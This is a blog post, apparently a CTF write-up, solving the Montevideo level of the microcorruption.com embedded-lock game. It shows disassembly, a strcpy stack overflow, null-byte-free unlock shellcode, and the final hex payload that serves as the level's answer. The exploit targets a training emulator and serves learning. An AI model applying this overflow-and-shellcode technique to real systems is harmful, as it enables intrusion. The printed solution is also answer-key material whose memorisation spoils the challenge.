<!doctype html><html lang=en>
<head>
<title>
microcorruption - montevideo ::
#!/bin/note
— a checkbox uncheckers notepad
</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content=" This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Whitehorse. This challenge is titled Montevideo.
The challenge has the following description when you start:
 This is Software Revision 03. We have received unconfirmed reports of issues with the previous series of locks. We have reimplemented much of the code according to our internal Secure Development Process.
 Cool. So this one is going to be unbreakable right? Lets see!
">
<meta name=keywords content="blog,hack,ctf,leonjza,pentester,red team,attack">
<meta name=robots content="noodp">
<link rel=canonical href=https://leonjza.github.io/blog/2018/03/08/microcorruption-montevideo/>
<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
<link rel=stylesheet href=https://leonjza.github.io/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary">
<meta name=twitter:title content="microcorruption - montevideo">
<meta name=twitter:description content="
    
    
  


This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Whitehorse. This challenge is titled Montevideo.
The challenge has the following description when you start:

This is Software Revision 03. We have received unconfirmed reports of issues with the previous series of locks. We have reimplemented much of the code according to our internal Secure Development Process.

Cool. So this one is going to be unbreakable right? Lets see!">
<meta property="og:title" content="microcorruption - montevideo">
<meta property="og:description" content="
    
    
  


This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Whitehorse. This challenge is titled Montevideo.
The challenge has the following description when you start:

This is Software Revision 03. We have received unconfirmed reports of issues with the previous series of locks. We have reimplemented much of the code according to our internal Secure Development Process.

Cool. So this one is going to be unbreakable right? Lets see!">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2018/03/08/microcorruption-montevideo/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2018-03-08T18:12:36+02:00">
<meta property="article:modified_time" content="2018-03-08T18:12:36+02:00"><meta property="og:site_name" content="#!/bin/note
">
</head>
<body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>#!/bin/note
</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/about/>About Me</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/about/>About Me</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>microcorruption - montevideo</h1>
<div class=post-meta>
<span class=post-date>
2018-03-08
</span>
<span class=post-read-time>— 6 min read</span>
</div>
<div class=post-content>
<h2>Table of Contents</h2>
<aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li>
<ul>
<li><a href=#montevideo>montevideo</a></li>
<li><a href=#solution>solution</a></li>
<li><a href=#other-challenges>other challenges</a></li>
</ul>
</li>
</ul>
</nav></aside>
<figure class=left>
<img src=/images/microcorruption/microcorruption.png>
</figure>
<p>This post is part of the series of solving <a href=https://microcorruption.com>microcorruption.com</a> ctf challenges which continues from the <a href=https://leonjza.github.io/blog/2018/03/07/microcorruption---whitehorse/>previous challenge</a> called <em>Whitehorse</em>. This challenge is titled <em>Montevideo</em>.</p>
<p>The challenge has the following description when you start:</p>
<blockquote>
<p>This is Software Revision 03. We have received unconfirmed reports of issues with the previous series of locks. We have reimplemented much of the code according to our internal Secure Development Process.</p>
</blockquote>
<p>Cool. So this one is going to be unbreakable right? Lets see!</p>
<h2 id=montevideo>montevideo</h2>
<p>Montevideo follows a similar code pattern when compared to some of the previous challenges we have done where a simple <code>main</code> routine calls <code>login</code>. Looking at <code>login</code> itself we can see a few new things:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#960050;background-color:#1e0010>44</span><span style=color:#a6e22e>f4</span> <span style=color:#960050;background-color:#1e0010>&lt;</span><span style=color:#66d9ef>login</span><span style=color:#960050;background-color:#1e0010>&gt;</span>

<span style=color:#960050;background-color:#1e0010>[</span><span style=color:#a6e22e>..</span> <span style=color:#66d9ef>typical</span> <span style=color:#66d9ef>getsn</span> <span style=color:#66d9ef>call</span> <span style=color:#66d9ef>to</span> <span style=color:#66d9ef>get</span> <span style=color:#66d9ef>the</span> <span style=color:#66d9ef>password</span> <span style=color:#66d9ef>..</span>]

<span style=color:#75715e>; strcpy, thats new!
</span><span style=color:#75715e></span><span style=color:#960050;background-color:#1e0010>451</span>a:  <span style=color:#a6e22e>b012</span> <span style=color:#66d9ef>dc45</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x45dc &lt;strcpy&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>451</span><span style=color:#66d9ef>e</span>:  <span style=color:#ae81ff>3</span><span style=color:#66d9ef>d40</span> <span style=color:#ae81ff>6400</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x64, r13
</span><span style=color:#75715e></span><span style=color:#ae81ff>4522</span>:  <span style=color:#ae81ff>0</span><span style=color:#66d9ef>e43</span>           <span style=color:#66d9ef>clr</span>   <span style=color:#66d9ef>r14</span>
<span style=color:#960050;background-color:#1e0010>4524:</span>  <span style=color:#960050;background-color:#1e0010>3</span><span style=color:#a6e22e>f40</span> <span style=color:#ae81ff>0024</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x2400, r15
</span><span style=color:#75715e></span>
<span style=color:#75715e>; memset is also an interesting one!
</span><span style=color:#75715e></span><span style=color:#960050;background-color:#1e0010>4528:</span>  <span style=color:#a6e22e>b012</span> <span style=color:#66d9ef>f045</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x45f0 &lt;memset&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>452</span><span style=color:#66d9ef>c</span>:  <span style=color:#ae81ff>0</span><span style=color:#66d9ef>f41</span>           <span style=color:#66d9ef>mov</span>   <span style=color:#66d9ef>sp</span>, <span style=color:#66d9ef>r15</span>

<span style=color:#75715e>; probably checks the password again
</span><span style=color:#75715e></span><span style=color:#960050;background-color:#1e0010>452</span>e:  <span style=color:#a6e22e>b012</span> <span style=color:#ae81ff>4644</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4446 &lt;conditional_unlock_door&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>4532</span>:  <span style=color:#ae81ff>0</span><span style=color:#66d9ef>f93</span>           <span style=color:#66d9ef>tst</span>   <span style=color:#66d9ef>r15</span>

<span style=color:#960050;background-color:#1e0010>[</span><span style=color:#a6e22e>..</span> <span style=color:#66d9ef>some</span> <span style=color:#66d9ef>messages</span> <span style=color:#66d9ef>printed</span> <span style=color:#66d9ef>to</span> <span style=color:#66d9ef>tell</span> <span style=color:#66d9ef>if</span> <span style=color:#66d9ef>you</span> <span style=color:#66d9ef>unlocked</span> <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>not</span> <span style=color:#66d9ef>..</span>]

<span style=color:#960050;background-color:#1e0010>4544:</span>  <span style=color:#960050;background-color:#1e0010>3150</span> <span style=color:#960050;background-color:#1e0010>1000</span>      <span style=color:#a6e22e>add</span>   <span style=color:#75715e>#0x10, sp
</span><span style=color:#75715e></span><span style=color:#ae81ff>4548</span>:  <span style=color:#ae81ff>3041</span>           <span style=color:#66d9ef>ret</span>
</code></pre></div><p>The calls to <code>strcpy</code> and <code>memset</code> immediately jumped out at me here. I also figured since there is mention of the password size again the bug here might be related to a stack overflow too. To test this, I threw in like 30 <code>A</code>&rsquo;s into the password field to see if the program breaks.</p>
<figure class=left>
<img src=/images/microcorruption/montevideo_stack_overflow.png>
</figure>
<blockquote>
<p>insn address unaligned</p>
</blockquote>
<p>Nice! The program counter (<code>pc</code>) has <code>0x4141</code> which most probably comes from our longer-than-its-supposed-to-be password we supplied. With this bug in mind, I quickly had a look at the other routines to see if there is anything interesting happening there. I set up a total of four breakpoints at the following locations:</p>
<ul>
<li><code>0x4510</code> at <code>getsn</code></li>
<li><code>0x451a</code> at <code>strcpy</code></li>
<li><code>0x4528</code> at <code>memset</code></li>
<li><code>0x452e</code> at <code>conditional_unlock_door</code></li>
</ul>
<p>Inspecting these routines manually, as well as the memory layout after each function had me draw the following conclusions:</p>
<ul>
<li>After <code>getsn</code> is done, the password buffer lives at <code>0x2400</code> in memory.</li>
<li>Once <code>strcpy</code> is done, the password buffer at <code>0x2400</code> is copied into a buffer that starts at <code>0x43ef</code>.</li>
<li>After <code>memset</code> is done, the password buffer at <code>0x2400</code> is zeroed out.</li>
<li>After <code>conditional_unlock_door</code> with a too long password buffer, the stack is corrupt and the return address to <code>main</code> overridden.</li>
</ul>
<p>It seems like this challenge is pretty much exactly the same as previous Whitehorse challenge? The <code>conditional_unlock_door</code> routine calls syscall <code>0x7e</code>, so with our overflow this is not a useful location to jump to as the &ldquo;HSM&rdquo; will validate the password. So, like the previous one, we just need a spot to slide in some shellcode.</p>
<p>Before we can supply the shellcode though, we need to find out where we are overriding and corrupting the stack for that <code>ret</code> instruction. For this, I just supplied a bunch of <code>A</code>&rsquo;s and <code>B</code>&rsquo;s and found that at position 17 and 18 again we have control over the programs execution flow.</p>
<figure class=left>
<img src=/images/microcorruption/monte_video_ret_control.png>
</figure>
<p>Next, we choose a location in memory where our password buffer is as the address we should jump to (as a result of the <code>ret</code>) which should also be the start of our shellcode. I simply copied the unlock shellcode from <a href=https://leonjza.github.io/blog/2018/03/07/microcorruption---whitehorse/>Whitehorse</a> which was <code>30127f00b0123245</code>. The shellcode itself needs a little work though as the address to the <code>INT</code> routine would be different here.</p>
<p>To help with the shellcode modifications we need to do, we can use the assembler/dissasembler provided on microcorruption.com <a href=https://microcorruption.com/assembler>here</a>. Grab the opcodes that form part of our shellcode, paste them into the input box and hit disassemble. Now, with the ASM mnemonics in the input box, update the address to <code>call</code> to <code>0x454c</code> as that is where it lives in this challenge. Finally, hit assemble and be presented with your shellcode :D</p>
<figure class=left>
<img src=/images/microcorruption/montevideo_shellcode_1.png>
</figure>
<p>I figured a good spot to jump to our shellcode would be just after the <code>ret</code> address at <code>0x4400</code>, so, my password payload was now going to be:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text># ret is 0x4400, so 0044 little endian

[padding to ret] +  [ret] +    [shellcode]
---------------------------------------------
    41 * 16      +  0044  +  30127f00b0124c45 =

# final password payload
41414141414141414141414141414141004430127f00b0124c45
</code></pre></div><p>Sending this password payload, and inspecting the program after a breakpoint at <code>0x4548</code> left the program in a confusing state.</p>
<figure class=left>
<img src=/images/microcorruption/montevideo_strcpy_nullbyte.png>
</figure>
<p>It was clear that the jump to <code>0x4400</code> was taken as the program counter (<code>pc</code>) was there, but, my shellcode was missing. Well&mldr; if you have ever dealt with <code>strcpy</code> before, you may have spotted that this was going to happen as soon as I chose <code>0x4400</code> as the address to jump to, as that address contains a nullbyte which is a string terminator for <code>strcpy</code>. Easy fix really, just move along two bytes to avoid a <code>0x00</code> byte in our payload. With a two byte shift, our password payload looks something like this now:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>[padding to ret] +  [ret] +  [pad] + [shellcode]
-----------------------------------------------------
    41 * 16      +  0244  +  4242  + 30127f00b0124c45

414141414141414141414141414141410244424230127f00b0124c45
</code></pre></div>
<figure class=left>
<img src=/images/microcorruption/montevideo_null_byte_shellcode.png>
</figure>
<p>Snap. We have made some progress, but there is still a null byte in our shellcode because of the opcodes that form part of the <code>push #0x7f</code> instruction (<code>3012 7f00</code>). We need to get rid of the <code>0x00</code> byte. We can simply modify the shellcode to use any other instructions that will eventually push the value <code>0xf7</code> to the stack. Think of things like moving a large value into a register, performing arithmetic and then moving the resultant register value onto the stack instead of the original value as is.</p>
<p>I used existing instructions in the program as a reference for ideas on how I can modify the shellcode to avoid null bytes. This was the final shellcode I got to work using the disassembler <a href=https://microcorruption.com/assembler>here</a>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#a6e22e>mov</span>     <span style=color:#75715e>#0x117e, r9
</span><span style=color:#75715e></span><span style=color:#66d9ef>sub</span>     <span style=color:#75715e>#0x10ff, r9
</span><span style=color:#75715e></span><span style=color:#66d9ef>push</span>    <span style=color:#66d9ef>r9</span>
<span style=color:#a6e22e>call</span>    <span style=color:#75715e>#0x454c
</span></code></pre></div><p>First, I took a large 2 byte value of <code>0x117e</code> and moved that to <code>r9</code>. I then took a calculator and subtracted the desired value of <code>0x7f</code> from <code>0x117e</code> and got to <code>0x10ff</code>. That resulted in my second instruction of <code>sub #0x10ff, r9</code> which should leave the value <code>0x7f</code> in register <code>r9</code>. Finally, just push <code>r9</code> onto the stack and call <code>INT</code>.</p>
<figure class=left>
<img src=/images/microcorruption/montevideo_final_shellcode.png>
</figure>
<p>So now, my final password payload looks as follows:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;print(&#39;41&#39; * 16 + &#39;0244&#39; + &#39;4242&#39; + &#39;39407e113980ff100912b0124c45&#39;)&#34;</span>
<span style=color:#ae81ff>414141414141414141414141414141410244424239407e113980</span>ff100912b0124c45
</code></pre></div>
<figure class=left>
<img src=/images/microcorruption/montevideo_unlock.png>
</figure>
<p>Works! <code>r9</code> ends up as <code>0x7f</code>, pushed to the stack and <code>INT</code> is called to unlock the lock.</p>
<h2 id=solution>solution</h2>
<p>Enter <code>414141414141414141414141414141410244424239407e113980ff100912b0124c45</code> as hex encoded input.</p>
<h2 id=other-challenges>other challenges</h2>
<p>For my other write ups in the microcorruption series, checkout <a href=https://leonjza.github.io/categories/microcorruption/>this</a> link.</p>
</div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Read other posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=https://leonjza.github.io/blog/2018/03/09/microcorruption-johannesburg/>
<span class=button__icon>←</span>
<span class=button__text>microcorruption - johannesburg</span>
</a>
</span>
<span class="button next">
<a href=https://leonjza.github.io/blog/2018/03/07/microcorruption-whitehorse/>
<span class=button__text>microcorruption - whitehorse</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
</div>
</footer>
<script src=https://leonjza.github.io/assets/main.js></script>
<script src=https://leonjza.github.io/assets/prism.js></script>
</div>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
</body>
</html>